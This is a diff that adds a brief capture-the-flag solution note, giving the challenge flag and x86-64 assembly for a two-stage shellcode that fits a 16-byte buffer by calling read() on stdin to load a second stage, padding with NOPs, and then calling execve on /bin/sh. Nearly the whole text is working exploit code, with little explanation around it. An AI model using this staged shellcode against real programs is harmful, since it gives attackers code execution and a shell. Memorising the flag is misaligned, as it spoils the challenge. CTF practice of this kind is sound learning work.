@@ -1,0 +1,23 @@
+FLAG: flag{mUlt1st4ge_1s_w4y_3asier!!!}
+OBJ: limited buffer of 16 byte in which to write
+IDEA: invoke a read and write the rest on the code
+
+INVOCATION OF READ OVER STDINPUT
+xor    rdi,rdi
+mov    rsi,rax
+add    rdx,0x3c
+xor    rax,rax
+syscall
+nop
+
+OVERWRITE WHAT HAS BEEN WRITTEN ABOVE
+nop x16 
+
+EXECUTE EXECV FOR /BIN/SH
+mov    rdi,rcx
+add    rdi,0x16
+mov    rax,0x3b
+xor    rsi,rsi
+xor    rdx,rdx
+syscall
+
